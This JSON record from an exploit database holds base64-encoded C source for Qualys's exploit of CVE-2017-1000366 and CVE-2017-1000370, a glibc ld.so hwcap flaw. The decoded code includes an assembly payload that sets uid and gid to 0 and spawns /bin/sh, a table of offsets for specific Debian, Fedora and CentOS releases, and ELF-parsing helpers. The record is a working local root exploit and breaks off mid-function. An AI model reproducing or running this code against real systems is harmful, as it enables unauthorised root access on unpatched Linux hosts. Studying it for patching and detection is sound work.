{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExpbnV4X2xkc29faHdjYXAuYyBmb3IgQ1ZFLTIwMTctMTAwMDM2NiwgQ1ZFLTIwMTctMTAwMDM3MA0KICogQ29weXJpZ2h0IChDKSAyMDE3IFF1YWx5cywgSW5jLg0KICoNCiAqIG15X2ltcG9ydGFudF9od2NhcHMoKSBhZGFwdGVkIGZyb20gZWxmL2RsLWh3Y2Fwcy5jLA0KICogcGFydCBvZiB0aGUgR05VIEMgTGlicmFyeToNCiAqIENvcHlyaWdodCAoQykgMjAxMi0yMDE3IEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgSW5jLg0KICoNCiAqIFRoaXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5DQogKiBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQ0KICogdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVyIHZlcnNpb24gMyBvZiB0aGUgTGljZW5zZSwgb3INCiAqIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsDQogKiBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZg0KICogTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQ0KICogR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4NCiAqDQogKiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQ0KICogYWxvbmcgd2l0aCB0aGlzIHByb2dyYW0uICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzLz4uDQogKi8NCg0KLyoqDQpjYXQgPiBsYS5jIDw8ICJFT0YiDQpzdGF0aWMgdm9pZCBfX2F0dHJpYnV0ZV9fICgoY29uc3RydWN0b3IpKSBfaW5pdCAodm9pZCkgew0KICAgIF9fYXNtX18gX192b2xhdGlsZV9fICgNCiAgICAiYWRkbCAkNjQsICVlc3A7Ig0KICAgIC8vIHNldHVpZCgwKTsNCiAgICAibW92bCAkMjMsICVlYXg7Ig0KICAgICJtb3ZsICQwLCAlZWJ4OyINCiAgICAiaW50ICQweDgwOyINCiAgICAvLyBzZXRnaWQoMCk7DQogICAgIm1vdmwgJDQ2LCAlZWF4OyINCiAgICAibW92bCAkMCwgJWVieDsiDQogICAgImludCAkMHg4MDsiDQogICAgLy8gZHVwMigwLCAxKTsNCiAgICAibW92bCAkNjMsICVlYXg7Ig0KICAgICJtb3ZsICQwLCAlZWJ4OyINCiAgICAibW92bCAkMSwgJWVjeDsiDQogICAgImludCAkMHg4MDsiDQogICAgLy8gZHVwMigwLCAyKTsNCiAgICAibW92bCAkNjMsICVlYXg7Ig0KICAgICJtb3ZsICQwLCAlZWJ4OyINCiAgICAibW92bCAkMiwgJWVjeDsiDQogICAgImludCAkMHg4MDsiDQogICAgLy8gZXhlY3ZlKCIvYmluL3NoIik7DQogICAgIm1vdmwgJDExLCAlZWF4OyINCiAgICAicHVzaGwgJDB4MDA2ODczMmY7Ig0KICAgICJwdXNobCAkMHg2ZTY5NjIyZjsiDQogICAgIm1vdmwgJWVzcCwgJWVieDsiDQogICAgIm1vdmwgJDAsICVlZHg7Ig0KICAgICJwdXNobCAlZWR4OyINCiAgICAicHVzaGwgJWVieDsiDQogICAgIm1vdmwgJWVzcCwgJWVjeDsiDQogICAgImludCAkMHg4MDsiDQogICAgLy8gZXhpdCgwKTsNCiAgICAibW92bCAkMSwgJWVheDsiDQogICAgIm1vdmwgJDAsICVlYng7Ig0KICAgICJpbnQgJDB4ODA7Ig0KICAgICk7DQp9DQpFT0YNCmdjYyAtZnBpYyAtc2hhcmVkIC1ub3N0ZGxpYiAtT3MgLXMgLW8gbGEuc28gbGEuYw0KeHhkIC1pIGxhLnNvID4gbGEuc28uaA0KKiovDQoNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCiNpbmNsdWRlIDxhc3NlcnQuaD4NCiNpbmNsdWRlIDxlbGYuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KI2luY2x1ZGUgPGxpbmsuaD4NCiNpbmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy9wYXJhbS5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojZGVmaW5lIFBBR0VTWiAoKHNpemVfdCk0MDk2KQ0KI2RlZmluZSBTVEFDS19BTElHTiAoKHNpemVfdCkxNikNCiNkZWZpbmUgTUFMTE9DX0FMSUdOICgoc2l6ZV90KTgpDQoNCiNkZWZpbmUgTU1BUF9CQVNFICgodWludHB0cl90KTB4NDAwMDAwMDApDQojZGVmaW5lIE1NQVBfUkFORCAoKHNpemVfdCkxPDwyMCkNCg0KI2RlZmluZSBTVEFDS19CQVNFICgodWludHB0cl90KTB4QzAwMDAwMDApDQojZGVmaW5lIFNUQUNLX1JBTkQgKChzaXplX3QpODw8MjApDQoNCiNkZWZpbmUgTUFYX0FSR19TVFJMRU4gKChzaXplX3QpMTI4PDwxMCkNCiNkZWZpbmUgTUFYX0FSR19TVFJJTkdTICgoc2l6ZV90KTB4N0ZGRkZGRkYpDQoNCnN0YXRpYyBjb25zdCBzdHJ1Y3QgdGFyZ2V0ICogdGFyZ2V0Ow0Kc3RhdGljIGNvbnN0IHN0cnVjdCB0YXJnZXQgew0KICAgIGNvbnN0IGNoYXIgKiBuYW1lOw0KICAgIHNpemVfdCBtZW1hbGlnbl91cDsNCiAgICBzaXplX3QgbnN5c3RlbV9kaXJzX2xlbjsNCiAgICBzaXplX3Qgc2l6ZW9mX3N5c3RlbV9kaXJzOw0KICAgIGNvbnN0IGNoYXIgKiByZXBsX2xpYjsNCiAgICBpbnQgaWdub3JlX2xpYjsNCiAgICBpbnQgaWdub3JlX29yaWdpbjsNCn0gdGFyZ2V0c1tdID0gew0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiRGViaWFuIDcgKHdoZWV6eSkiLA0KICAgICAgICAubWVtYWxpZ25fdXAgPSBQQUdFU1osDQogICAgICAgIC5uc3lzdGVtX2RpcnNfbGVuID0gNCwNCiAgICAgICAgLnNpemVvZl9zeXN0ZW1fZGlycyA9IHNpemVvZigiL2xpYi9pMzg2LWxpbnV4LWdudS9cMCIgIi91c3IvbGliL2kzODYtbGludXgtZ251L1wwIiAiL2xpYi9cMCIgIi91c3IvbGliLyIpLA0KICAgICAgICAucmVwbF9saWIgPSAibGliL2kzODYtbGludXgtZ251IiwNCiAgICAgICAgLmlnbm9yZV9saWIgPSAwLA0KICAgICAgICAuaWdub3JlX29yaWdpbiA9IDAsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkRlYmlhbiA4IChqZXNzaWUpIiwNCiAgICAgICAgLm1lbWFsaWduX3VwID0gUEFHRVNaLA0KICAgICAgICAubnN5c3RlbV9kaXJzX2xlbiA9IDQsDQogICAgICAgIC5zaXplb2Zfc3lzdGVtX2RpcnMgPSBzaXplb2YoIi9saWIvaTM4Ni1saW51eC1nbnUvXDAiICIvdXNyL2xpYi9pMzg2LWxpbnV4LWdudS9cMCIgIi9saWIvXDAiICIvdXNyL2xpYi8iKSwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgICAgIC5pZ25vcmVfbGliID0gMCwNCiAgICAgICAgLmlnbm9yZV9vcmlnaW4gPSAwLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJEZWJpYW4gOSAoc3RyZXRjaCkiLA0KICAgICAgICAubWVtYWxpZ25fdXAgPSAyICogUEFHRVNaLA0KICAgICAgICAubnN5c3RlbV9kaXJzX2xlbiA9IDQsDQogICAgICAgIC5zaXplb2Zfc3lzdGVtX2RpcnMgPSBzaXplb2YoIi9saWIvaTM4Ni1saW51eC1nbnUvXDAiICIvdXNyL2xpYi9pMzg2LWxpbnV4LWdudS9cMCIgIi9saWIvXDAiICIvdXNyL2xpYi8iKSwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgICAgIC5pZ25vcmVfbGliID0gMCwNCiAgICAgICAgLmlnbm9yZV9vcmlnaW4gPSAwLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJEZWJpYW4gMTAgKGJ1c3RlcikiLA0KICAgICAgICAubWVtYWxpZ25fdXAgPSAyICogUEFHRVNaLA0KICAgICAgICAubnN5c3RlbV9kaXJzX2xlbiA9IDQsDQogICAgICAgIC5zaXplb2Zfc3lzdGVtX2RpcnMgPSBzaXplb2YoIi9saWIvaTM4Ni1saW51eC1nbnUvXDAiICIvdXNyL2xpYi9pMzg2LWxpbnV4LWdudS9cMCIgIi9saWIvXDAiICIvdXNyL2xpYi8iKSwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgICAgIC5pZ25vcmVfbGliID0gMCwNCiAgICAgICAgLmlnbm9yZV9vcmlnaW4gPSAwLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJGZWRvcmEgMjMgKFNlcnZlciBFZGl0aW9uKSIsDQogICAgICAgIC5tZW1hbGlnbl91cCA9IFBBR0VTWiwNCiAgICAgICAgLm5zeXN0ZW1fZGlyc19sZW4gPSAyLA0KICAgICAgICAuc2l6ZW9mX3N5c3RlbV9kaXJzID0gc2l6ZW9mKCIvbGliL1wwIiAiL3Vzci9saWIvIiksDQogICAgICAgIC5yZXBsX2xpYiA9ICJsaWIiLA0KICAgICAgICAuaWdub3JlX2xpYiA9IDAsDQogICAgICAgIC5pZ25vcmVfb3JpZ2luID0gMCwNCiAgICB9LA0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiRmVkb3JhIDI0IChTZXJ2ZXIgRWRpdGlvbikiLA0KICAgICAgICAubWVtYWxpZ25fdXAgPSBQQUdFU1osDQogICAgICAgIC5uc3lzdGVtX2RpcnNfbGVuID0gMiwNCiAgICAgICAgLnNpemVvZl9zeXN0ZW1fZGlycyA9IHNpemVvZigiL2xpYi9cMCIgIi91c3IvbGliLyIpLA0KICAgICAgICAucmVwbF9saWIgPSAibGliIiwNCiAgICAgICAgLmlnbm9yZV9saWIgPSAwLA0KICAgICAgICAuaWdub3JlX29yaWdpbiA9IDAsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkZlZG9yYSAyNSAoU2VydmVyIEVkaXRpb24pIiwNCiAgICAgICAgLm1lbWFsaWduX3VwID0gMiAqIFBBR0VTWiwNCiAgICAgICAgLm5zeXN0ZW1fZGlyc19sZW4gPSAyLA0KICAgICAgICAuc2l6ZW9mX3N5c3RlbV9kaXJzID0gc2l6ZW9mKCIvbGliL1wwIiAiL3Vzci9saWIvIiksDQogICAgICAgIC5yZXBsX2xpYiA9ICJsaWIiLA0KICAgICAgICAuaWdub3JlX2xpYiA9IDAsDQogICAgICAgIC5pZ25vcmVfb3JpZ2luID0gMCwNCiAgICB9LA0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiQ2VudE9TIDUuMyAoRmluYWwpIiwNCiAgICAgICAgLm1lbWFsaWduX3VwID0gUEFHRVNaLA0KICAgICAgICAubnN5c3RlbV9kaXJzX2xlbiA9IDIsDQogICAgICAgIC5zaXplb2Zfc3lzdGVtX2RpcnMgPSBzaXplb2YoIi9saWIvXDAiICIvdXNyL2xpYi8iKSwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYiIsDQogICAgICAgIC5pZ25vcmVfbGliID0gMSwNCiAgICAgICAgLmlnbm9yZV9vcmlnaW4gPSAwLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJDZW50T1MgNS4xMSAoRmluYWwpIiwNCiAgICAgICAgLm1lbWFsaWduX3VwID0gUEFHRVNaLA0KICAgICAgICAubnN5c3RlbV9kaXJzX2xlbiA9IDIsDQogICAgICAgIC5zaXplb2Zfc3lzdGVtX2RpcnMgPSBzaXplb2YoIi9saWIvXDAiICIvdXNyL2xpYi8iKSwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYiIsDQogICAgICAgIC5pZ25vcmVfbGliID0gMCwNCiAgICAgICAgLmlnbm9yZV9vcmlnaW4gPSAxLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJDZW50T1MgNi4wIChGaW5hbCkiLA0KICAgICAgICAubWVtYWxpZ25fdXAgPSBQQUdFU1osDQogICAgICAgIC5uc3lzdGVtX2RpcnNfbGVuID0gMiwNCiAgICAgICAgLnNpemVvZl9zeXN0ZW1fZGlycyA9IHNpemVvZigiL2xpYi9cMCIgIi91c3IvbGliLyIpLA0KICAgICAgICAucmVwbF9saWIgPSAibGliIiwNCiAgICAgICAgLmlnbm9yZV9saWIgPSAwLA0KICAgICAgICAuaWdub3JlX29yaWdpbiA9IDAsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkNlbnRPUyA2LjggKEZpbmFsKSIsDQogICAgICAgIC5tZW1hbGlnbl91cCA9IFBBR0VTWiwNCiAgICAgICAgLm5zeXN0ZW1fZGlyc19sZW4gPSAyLA0KICAgICAgICAuc2l6ZW9mX3N5c3RlbV9kaXJzID0gc2l6ZW9mKCIvbGliL1wwIiAiL3Vzci9saWIvIiksDQogICAgICAgIC5yZXBsX2xpYiA9ICJsaWIiLA0KICAgICAgICAuaWdub3JlX2xpYiA9IDAsDQogICAgICAgIC5pZ25vcmVfb3JpZ2luID0gMSwNCiAgICB9LA0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiQ2VudE9TIDcuMi4xNTExIChBbHRBcmNoKSIsDQogICAgICAgIC5tZW1hbGlnbl91cCA9IFBBR0VTWiwNCiAgICAgICAgLm5zeXN0ZW1fZGlyc19sZW4gPSAyLA0KICAgICAgICAuc2l6ZW9mX3N5c3RlbV9kaXJzID0gc2l6ZW9mKCIvbGliL1wwIiAiL3Vzci9saWIvIiksDQogICAgICAgIC5yZXBsX2xpYiA9ICJsaWIiLA0KICAgICAgICAuaWdub3JlX2xpYiA9IDAsDQogICAgICAgIC5pZ25vcmVfb3JpZ2luID0gMCwNCiAgICB9LA0KfTsNCg0KI2RlZmluZSBkaWUoKSBkbyB7IFwNCiAgICBwcmludGYoImRpZWQgaW4gJXM6ICV1XG4iLCBfX2Z1bmNfXywgX19MSU5FX18pOyBcDQogICAgZXhpdChFWElUX0ZBSUxVUkUpOyBcDQp9IHdoaWxlICgwKQ0KDQpzdGF0aWMgY29uc3QgRWxmVyhhdXh2X3QpICogbXlfYXV4djsNCg0Kc3RhdGljIHVuc2lnbmVkIGxvbmcgaW50DQpteV9nZXRhdXh2YWwgKGNvbnN0IHVuc2lnbmVkIGxvbmcgaW50IHR5cGUpDQp7DQogICAgY29uc3QgRWxmVyhhdXh2X3QpICogcDsNCg0KICAgIGlmICghbXlfYXV4dikgZGllKCk7DQogICAgZm9yIChwID0gbXlfYXV4djsgcC0+YV90eXBlICE9IEFUX05VTEw7IHArKykNCiAgICAgICAgaWYgKHAtPmFfdHlwZSA9PSB0eXBlKQ0KICAgICAgICAgICAgcmV0dXJuIHAtPmFfdW4uYV92YWw7DQogICAgZGllKCk7DQp9DQoNCnN0YXRpYyBzaXplX3QNCmdldF9lbGZfbW1hcHMoY29uc3QgY2hhciAqIGNvbnN0IGJpbmFyeSkNCnsNCiAgICBpZiAoIWJpbmFyeSkgZGllKCk7DQogICAgaWYgKCpiaW5hcnkgIT0gJy8nKSBkaWUoKTsNCiAgICBzdHJ1Y3Qgc3RhdCBzdDsNCiAgICBpZiAoc3RhdChiaW5hcnksICZzdCkpIGRpZSgpOw0KICAgIGlmICghU19JU1JFRyhzdC5zdF9tb2RlKSkgZGllKCk7DQogICAgaWYgKHN0LnN0X3NpemUgPD0gMCkgZGllKCk7DQogICAgI2RlZmluZSBTQUZFU1ogKChzaXplX3QpNjQ8PDIwKQ0KICAgIGlmIChzdC5zdF9zaXplID49IChzc2l6ZV90KVNBRkVTWikgZGllKCk7DQogICAgY29uc3Qgc2l6ZV90IHNpemUgPSBzdC5zdF9zaXplOw0KICAgIHByaW50ZigiJXMgJXp1IG1tYXBzICIsIGJpbmFyeSwgc2l6ZSk7DQoNCiAgICBjb25zdCBpbnQgZmQgPSBvcGVuKGJpbmFyeSwgT19SRE9OTFkpOw0KICAgIGlmIChmZCA8PSAtMSkgew0KICAgICAgICBjb25zdCBzaXplX3QgbW1hcHMgPSAoc2l6ZSArIFBBR0VTWi0xKSAmIH4oUEFHRVNaLTEpOw0KICAgICAgICBwcmludGYoIiV6dSAodW5yZWFkYWJsZSlcbiIsIG1tYXBzKTsNCiAgICAgICAgcmV0dXJuIG1tYXBzOw0KICAgIH0NCiAgICB1aW50OF90ICogY29uc3QgYnVmID0gbWFsbG9jKHNpemUpOw0KICAgIGlmICghYnVmKSBkaWUoKTsNCiAgICBpZiAocmVhZChmZCwgYnVmLCBzaXplKSAhPSAoc3NpemVfdClzaXplKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UoZmQpKSBkaWUoKTsNCg0KICAgIGlmIChzaXplIDw9IHNpemVvZihFbGZXKEVoZHIpKSkgZGllKCk7DQogICAgY29uc3QgRWxmVyhFaGRyKSAqIGNvbnN0IGVoZHIgPSAoY29uc3QgRWxmVyhFaGRyKSAqKWJ1ZjsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcwXSAhPSBFTEZNQUcwKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcxXSAhPSBFTEZNQUcxKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcyXSAhPSBFTEZNQUcyKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUczXSAhPSBFTEZNQUczKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9DTEFTU10gIT0gRUxGQ0xBU1MzMikgZGllKCk7DQogICAgaWYgKGVoZHItPmVfaWRlbnRbRUlfREFUQV0gIT0gRUxGREFUQTJMU0IpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX21hY2hpbmUgIT0gRU1fMzg2KSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV92ZXJzaW9uICE9IEVWX0NVUlJFTlQpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX2Voc2l6ZSAhPSBzaXplb2YoRWxmVyhFaGRyKSkpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3BoZW50c2l6ZSAhPSBzaXplb2YoRWxmVyhQaGRyKSkpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3NoZW50c2l6ZSAhPSBzaXplb2YoRWxmVyhTaGRyKSkpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3Bob2ZmIDw9IDAgfHwgZWhkci0+ZV9waG9mZiA+PSBzaXplKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9zaG9mZiA8PSAwIHx8IGVoZHItPmVfc2hvZmYgPj0gc2l6ZSkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfcGhudW0gPiAoc2l6ZSAtIGVoZHItPmVfcGhvZmYpIC8gc2l6ZW9mKEVsZlcoUGhkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9zaG51bSA+IChzaXplIC0gZWhkci0+ZV9zaG9mZikgLyBzaXplb2YoRWxmVyhTaGRyKSkpIGRpZSgpOw0KDQogICAgaWYgKGVoZHItPmVfdHlwZSAhPSBFVF9EWU4pIHsNCiAgICAgICAgaWYgKGVoZHItPmVfdHlwZSAhPSBFVF9FWEVDKSBkaWUoKTsNCiAgICAgICAgY29uc3Qgc2l6ZV90IG1tYXBzID0gMDsNCiAgICAgICAgcHJpbnRmKCIlenUgKGV4ZWN1dGFibGUpXG4iLCBtbWFwcyk7DQogICAgICAgIGZyZWUoYnVmKTsNCiAgICAgICAgcmV0dXJuIG1tYXBzOw0KICAgIH0NCg0KICAgIHVpbnRwdHJfdCBmaXJzdF9tYXBfc3RhcnQgPSBVSU5UUFRSX01BWDsNCiAgICB1aW50cHRyX3QgbGFzdF9tYXBfZW5kID0gMDsNCiAgICB1bnNpZ25lZCBpbnQgaTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgZWhkci0+ZV9waG51bTsgaSsrKSB7DQogICAgICAgIGNvbnN0IEVsZlcoUGhkcikgKiBjb25zdCBwaGRyID0gKGNvbnN0IEVsZlcoUGhkcikgKikoYnVmICsgZWhkci0+ZV9waG9mZikgKyBpOw0KICAgICAgICBpZiAocGhkci0+cF90eXBlICE9IFBUX0xPQUQpIGNvbnRpbnVlOw0KDQogICAgICAgIGlmIChwaGRyLT5wX29mZnNldCA+PSBzaXplKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfZmlsZXN6ID4gc2l6ZSAtIHBoZHItPnBfb2Zmc2V0KSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfZmlsZXN6ID4gcGhkci0+cF9tZW1zeikgZGllKCk7DQogICAgICAgIGlmIChwaGRyLT5wX3ZhZGRyID49IFNUQUNLX0JBU0UpIGRpZSgpOw0KICAgICAgICBpZiAocGhkci0+cF9tZW1zeiA8PSAwKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfbWVtc3ogPj0gU0FGRVNaKSBkaWUoKTsNCiAgICAgICAgI3VuZGVmIFNBRkVTWg0KICAgICAgICBpZiAocGhkci0+cF9hbGlnbiAhPSBQQUdFU1opIGRpZSgpOw0KDQogICAgICAgIGNvbnN0IHVpbnRwdHJfdCBtYXBfc3RhcnQgPSBwaGRyLT5wX3ZhZGRyICYgfihQQUdFU1otMSk7DQogICAgICAgIGlmIChtYXBfc3RhcnQgPj0gVUlOVFBUUl9NQVgpIGRpZSgpOw0KICAgICAgICBpZiAobWFwX3N0YXJ0IDwgbGFzdF9tYXBfZW5kKSBkaWUoKTsNCg0KICAgICAgICBjb25zdCB1aW50cHRyX3QgbWFwX2VuZCA9IChwaGRyLT5wX3ZhZGRyICsgcGhkci0+cF9tZW1zeiArIFBBR0VTWi0xKSAmIH4oUEFHRVNaLTEpOw0KICAgICAgICBpZiAobWFwX2VuZCA8PSBtYXBfc3RhcnQpIGRpZSgpOw0KICAgICAgICBpZiAobWFwX2VuZCA8PSAwKSBkaWUoKTsNCg0KICAgICAgICBpZiAoZmlyc3RfbWFwX3N0YXJ0ID49IFVJTlRQVFJfTUFYKSB7DQogICAgICAgICAgICBmaXJzdF9tYXBfc3RhcnQgPSBtYXBfc3RhcnQ7DQogICAgICAgIH0NCiAgICAgICAgbGFzdF9tYXBfZW5kID0gbWFwX2VuZDsNCg0KICAgICAgICBzd2l0Y2ggKHBoZHItPnBfZmxhZ3MpIHsNCiAgICAgICAgICAgIGNhc2UgUEZfUiB8IFBGX1g6DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlIFBGX1IgfCBQRl9XOg0KICAgICAgICAgICAgICAgIGlmIChtYXBfc3RhcnQgPD0gZmlyc3RfbWFwX3N0YXJ0KSBkaWUoKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKGZpcnN0X21hcF9zdGFydCA+PSBVSU5UUFRSX01BWCkgZGllKCk7DQogICAgaWYgKGxhc3RfbWFwX2VuZCA8PSAwKSBkaWUoKTsNCiAgICBpZiAobGFzdF9tYXBfZW5kIDw9IGZpcnN0X21hcF9zdGFydCkgZGllKCk7DQogICAgY29uc3Qgc2l6ZV90IG1tYXBzID0gbGFzdF9tYXBfZW5kIC0gZmlyc3RfbWFwX3N0YXJ0Ow0KICAgIHByaW50ZigiJXp1ICglc3NoYXJlZCBvYmplY3QpXG4iLCBtbWFwcywgZmlyc3RfbWFwX3N0YXJ0ID8gInByZWxpbmtlZCAiIDogIiIpOw0KICAgIGZyZWUoYnVmKTsNCiAgICByZXR1cm4gbW1hcHM7DQp9DQoNCnN0YXRpYyBjb25zdCBjaGFyIG15X3g4Nl9jYXBfZmxhZ3NbMzJdWzhdID0gew0KICAgICJmcHUiLCAidm1lIiwgImRlIiwgInBzZSIsICJ0c2MiLCAibXNyIiwgInBhZSIsICJtY2UiLA0KICAgICJjeDgiLCAiYXBpYyIsICIxMCIsICJzZXAiLCAibXRyciIsICJwZ2UiLCAibWNhIiwgImNtb3YiLA0KICAgICJwYXQiLCAicHNlMzYiLCAicG4iLCAiY2xmbHVzaCIsICIyMCIsICJkdHMiLCAiYWNwaSIsICJtbXgiLA0KICAgICJmeHNyIiwgInNzZSIsICJzc2UyIiwgInNzIiwgImh0IiwgInRtIiwgImlhNjQiLCAicGJlIg0KfTsNCg0Kc3RhdGljIGNvbnN0IGNoYXIgbXlfeDg2X3BsYXRmb3Jtc1s0XVs1XSA9IHsNCiAgICAiaTM4NiIsICJpNDg2IiwgImk1ODYiLCAiaTY4NiINCn07DQoNCnN0YXRpYyBpbmxpbmUgY29uc3QgY2hhciAqDQpteV9od2NhcF9zdHJpbmcgKGNvbnN0IHVuc2lnbmVkIGludCBpZHgpDQp7DQogICAgaWYgKGlkeCA+PSBzaXplb2YobXlfeDg2X2NhcF9mbGFncykgLyBzaXplb2YobXlfeDg2X2NhcF9mbGFnc1swXSkpIGRpZSgpOw0KICAgIHJldHVybiBteV94ODZfY2FwX2ZsYWdzW2lkeF07DQp9DQoNCnN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIHsNCiAgICB1bnNpZ25lZCBsb25nIGh3Y2FwX21hc2s7DQogICAgc2l6ZV90IG1heF9jYXBzdHJsZW47DQogICAgc2l6ZV90IHBvaW50ZXJzOw0KICAgIHNpemVfdCBzdHJpbmdzOw0KICAgIHNpemVfdCBzZWFyY2hfZGlyczsNCiAgICBzaXplX3Qgc2VhcmNoX2RpcnNfMDsNCn07DQoNCnN0cnVjdCBteV9saW5rX21hcCB7DQogICAgY29uc3QgRWxmVyhQaGRyKSAqIGxfcGhkcjsNCiAgICBFbGZXKEhhbGYpIGxfcGhudW07DQogICAgRWxmVyhBZGRyKSBsX2FkZHI7DQp9Ow0KDQovKiBXZSB3YW50IHRvIGNhY2hlIGluZm9ybWF0aW9uIGFib3V0IHRoZSBzZWFyY2hlcyBmb3Igc2hhcmVkIG9iamVjdHMuICAqLw0KDQplbnVtIHJfZGlyX3N0YXR1cyB7IHVua25vd24sIG5vbmV4aXN0aW5nLCBleGlzdGluZyB9Ow0KDQpzdHJ1Y3Qgcl9zZWFyY2hfcGF0aF9lbGVtDQogIHsNCiAgICAvKiBUaGlzIGxpbmsgaXMgb25seSB1c2VkIGluIHRoZSBgYWxsX2RpcnMnIG1lbWJlciBvZiBgcl9zZWFyY2hfcGF0aCcuICAqLw0KICAgIHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0gKm5leHQ7DQoNCiAgICAvKiBTdHJpbmdzIHNheWluZyB3aGVyZSB0aGUgZGVmaW5pdGlvbiBjYW1lIGZyb20uICAqLw0KICAgIGNvbnN0IGNoYXIgKndoYXQ7DQogICAgY29uc3QgY2hhciAqd2hlcmU7DQoNCiAgICAvKiBCYXNlbmFtZSBmb3IgdGhpcyBzZWFyY2ggcGF0aCBlbGVtZW50LiAgVGhlIHN0cmluZyBtdXN0IGVuZCB3aXRoDQogICAgICAgYSBzbGFzaCBjaGFyYWN0ZXIuICAqLw0KICAgIGNvbnN0IGNoYXIgKmRpcm5hbWU7DQogICAgc2l6ZV90IGRpcm5hbWVsZW47DQoNCiAgICBlbnVtIHJfZGlyX3N0YXR1cyBzdGF0dXNbMF07DQogIH07DQoNCnN0cnVjdCByX3N0cmxlbnBhaXINCiAgew0KICAgIGNvbnN0IGNoYXIgKnN0cjsNCiAgICBzaXplX3QgbGVuOw0KICB9Ow0KDQovKiBSZXR1cm4gYW4gYXJyYXkgb2YgdXNlZnVsL25lY2Vzc2FyeSBoYXJkd2FyZSBjYXBhYmlsaXR5IG5hbWVzLiAgKi8NCnN0YXRpYyBzdHJ1Y3QgbXlfaW1wb3J0YW50X2h3Y2Fwcw0KbXlfaW1wb3J0YW50X2h3Y2FwcyAoY29uc3QgY2hhciAqIGNvbnN0IHBsYXRmb3JtLCBjb25zdCBzaXplX3QgcGxhdGZvcm1fbGVuLA0KICAgICAgICAgICAgICAg